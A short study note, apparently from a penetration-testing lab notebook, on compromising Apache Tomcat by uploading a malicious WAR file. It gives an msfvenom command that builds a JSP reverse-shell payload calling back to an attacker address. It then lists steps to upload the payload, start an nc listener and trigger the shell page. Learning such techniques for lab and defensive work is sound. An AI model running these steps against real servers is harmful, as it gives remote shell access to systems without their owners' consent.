---
title: Apache Tomcat Malicious WAR File
aliases: []
tags:
- topic/cybersecurity
- technique/web-shell
category: study_notes
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: msfvenom.md
related_tools:
- '[[msfvenom]]'
related_techniques:
- '[[T1190]]'
related_tactics: []
related_services:
- '[[apache-tomcat]]'
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# Apache Tomcat Malicious WAR File

## Description
- [[apache-tomcat]] malicous WAR file
- build payload `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war`
- upload payload to apache-tomcat
- start nc `nc -lnvp 4443`
- dynamic page, check backup.war for filename `bmtppbqhfprckpf.jsp`

